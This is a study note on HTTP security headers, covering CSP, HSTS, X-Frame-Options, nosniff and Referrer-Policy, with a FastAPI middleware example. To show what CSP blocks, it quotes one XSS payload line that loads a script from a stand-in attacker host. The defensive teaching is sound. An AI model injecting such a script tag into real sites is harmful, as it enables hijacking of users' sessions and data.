---
title: 07 - Security Headers
description: "HTTP security headers are server-sent directives that instruct browsers on how to handle content loading, framing, and communication, providing defense-in-depth against XSS, clickjacking, protocol downgrade attacks, and MIME-type confusion."
tags: [security-headers, csp, hsts, http-headers, security, layer-8]
status: draft
difficulty: intermediate
layer: 8
domain: security
created: 2026-05-18
---

# Security Headers

> Security headers are browser instructions that limit what damage can be done if other defenses fail  -  each header addresses a specific attack class and costs nothing to add.

---

## Quick Reference

**Core idea:**
- `Content-Security-Policy` (CSP): restricts which sources the browser may load scripts, styles, images, and other resources from  -  limits XSS impact
- `Strict-Transport-Security` (HSTS): tells the browser to only communicate with this domain over HTTPS, preventing protocol downgrade attacks
- `X-Frame-Options` (or CSP `frame-ancestors`): prevents the page from being embedded in an `<iframe>` on another origin  -  stops clickjacking
- `X-Content-Type-Options: nosniff`: prevents the browser from MIME-sniffing a response away from the declared content type
- `Referrer-Policy`: controls how much of the current URL is included in the `Referer` header when navigating to external links

**Tricky points:**
- CSP `default-src 'self'` blocks all external resources including CDNs and third-party scripts  -  must be carefully tuned before deploying
- `unsafe-inline` in CSP negates almost all XSS protection from CSP  -  avoid it; use nonces or hashes for inline scripts instead
- HSTS must be sent over HTTPS (never HTTP) and is enforced by the browser's HSTS preload list  -  setting a long `max-age` and then removing HTTPS support leaves users locked out
- `X-Frame-Options: DENY` is redundant if CSP `frame-ancestors 'none'` is set, but older browsers only understand `X-Frame-Options`
- `Permissions-Policy` (formerly `Feature-Policy`) controls browser API access (camera, microphone, geolocation)  -  increasingly important for privacy but not a security header in the traditional sense

---

## What It Is

Security headers are instructions written on the outside of a delivery truck. The truck (the HTTP response) arrives at the browser, and the browser reads the notes before opening the package. The notes say things like "only play the videos from these specific studios," "never show this page inside another page," and "always use the secure delivery route." These instructions do not prevent the truck from being hijacked  -  but they limit what harm the hijacker can do once the package is open.

That is the function of security headers: defense in depth. If XSS defenses fail and an attacker injects a script, a strict Content Security Policy prevents that script from loading resources from external attackers' servers. If an application has a mixed-content page, HSTS ensures the browser enforces HTTPS for all subsequent requests to that origin. These headers do not fix underlying vulnerabilities, but they significantly reduce the blast radius when vulnerabilities exist.

The browser is the enforcement point. Security headers are a contract between the server and the browser: the server declares its policy, the browser enforces it. This means security headers protect users running compliant modern browsers  -  they do not prevent direct API access or attacks from scripts already on the page. A penetration tester using `curl` will not be limited by your security headers. The protection is specifically for the typical user's browser interaction with your application.

---

## How It Actually Works

Content Security Policy is the most powerful and most complex security header. A minimal strict CSP for a server-rendered Python application:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'
```

This policy tells the browser: load scripts only from this origin (`'self'`), load styles only from this origin, allow images from this origin and data URIs, allow no plugins (`object-src 'none'`), restrict `<base>` tags to same-origin, and only allow forms to submit to same-origin endpoints. If an XSS payload injects `<script src="https://attacker.com/payload.js">`, the browser checks the CSP and refuses to load it  -  `attacker.com` is not in the `script-src` allowlist.

For inline scripts  -  code that appears directly in `<script>` tags in the HTML  -  CSP provides two safe alternatives to `unsafe-inline`. Nonces: the server generates a cryptographically random value per response and includes it in both the CSP header and each intended script tag. An injected script will not have the correct nonce. Hashes: the server computes a SHA-256 hash of the exact inline script content and includes it in the CSP. Any change to the script (including by injection) invalidates the hash.

HSTS is simpler but has a critical deployment consideration:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Once a browser receives this header, it remembers for `max-age` seconds that this domain should only be contacted over HTTPS. Subsequent requests to `http://yourdomain.com` are upgraded to HTTPS by the browser without ever contacting the server. The `preload` directive submits the domain to a browser preload list  -  the browser enforces HTTPS for this domain even on the very first visit, before it has ever received the header. This is the ultimate protection against SSL stripping attacks, but it is irreversible in the short term: if you need to downgrade from HTTPS, users on the preload list will be locked out until the max-age expires.

In FastAPI, security headers are applied via middleware:

```python
from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; script-src 'self'; object-src 'none'"
        )
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains"
        )
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)
```

The `Referrer-Policy: strict-origin-when-cross-origin` value is a reasonable default: it sends the full URL as the referrer for same-origin navigations but only the origin (no path or query string) for cross-origin navigations, and nothing at all when navigating from HTTPS to HTTP. This prevents internal URLs, user IDs, and sensitive path components from leaking to external sites via the `Referer` header.

---

## How It Connects

CSP is the primary browser-side mitigation for XSS  -  understanding both together is essential to see how the defense works.

[[xss|Cross-Site Scripting (XSS)]]

Security headers are applied as middleware in FastAPI, making understanding the middleware lifecycle important for correct implementation.

[[fastapi-middleware|Middleware in FastAPI]]

HTTP headers in general  -  their syntax, how they are structured, and how browsers process them  -  are foundational context for understanding what these specific headers do.

[[http-headers|HTTP Headers]]

---

## Common Misconceptions

Misconception 1: "Adding a Content-Security-Policy header prevents XSS."
Reality: CSP limits what injected scripts can do  -  it can prevent an injected script from loading external resources or executing at all if the policy blocks inline scripts. But CSP does not prevent the injection from occurring. If an attacker injects code that only reads from the current page's DOM (cookies, form data, localStorage) and exfiltrates via a same-origin fetch, a same-origin CSP cannot stop it. CSP is damage limitation, not XSS prevention. Output encoding prevents injection; CSP limits the impact of injection that gets through.

Misconception 2: "HSTS is the same as requiring HTTPS in the server configuration."
Reality: Server-side HTTPS-only configuration (HTTP redirecting to HTTPS) is server-to-browser enforcement. HSTS is browser-side enforcement. The difference matters for SSL stripping attacks, where an attacker in a man-in-the-middle position intercepts the initial HTTP request before the redirect, preventing the upgrade. HSTS tells the browser never to make an HTTP request to this origin in the first place, so there is no HTTP request for an attacker to intercept.

Misconception 3: "Security headers only matter for browsers  -  my API does not need them."
Reality: APIs consumed by browsers (including SPAs calling a REST API) benefit from CORS headers, HSTS, and X-Content-Type-Options. An API response with a permissive content type served over HTTP and embedded in a browser context can still be attacked. HSTS is particularly relevant for APIs that browser clients access over TLS.

---

## Why It Matters in Practice

Security headers are the easiest category of security control to implement  -  they are a few lines of middleware code  -  yet they are consistently missing from Python web applications in production. Analysis of public websites regularly finds that a large majority lack basic headers like HSTS and CSP. Security headers show up in penetration test reports as low-effort, high-value findings.

More concretely: the `X-Content-Type-Options: nosniff` header prevents an attack where a server serves user-uploaded content with a permissive content type and the browser re-interprets it as HTML or JavaScript. Without `nosniff`, an attacker who can upload files to a server (avatars, documents) can upload a file that contains HTML with a script tag, and some browsers will execute it even if the server claims `Content-Type: image/jpeg`. This attack class would be otherwise difficult to prevent for every possible file type.

---

## Interview Angle

Common question forms:
- "What security headers should every web application set?"
- "What does Content Security Policy do?"
- "What is HSTS and why is the `preload` directive important?"
- "How would you add security headers to a FastAPI application?"

Answer frame:
A strong answer names the five core headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy), explains each in one sentence, and can describe the specific attack each prevents. For CSP, it explains `default-src 'self'` and why `unsafe-inline` defeats the point. For HSTS, it distinguishes server-side redirects from browser-side enforcement. For FastAPI, it describes middleware as the implementation mechanism.

---

## Related Notes

- [[xss|Cross-Site Scripting (XSS)]]
- [[csrf|Cross-Site Request Forgery]]
- [[owasp-top-10|OWASP Top 10]]
- [[fastapi-middleware|Middleware in FastAPI]]
- [[http-headers|HTTP Headers]]
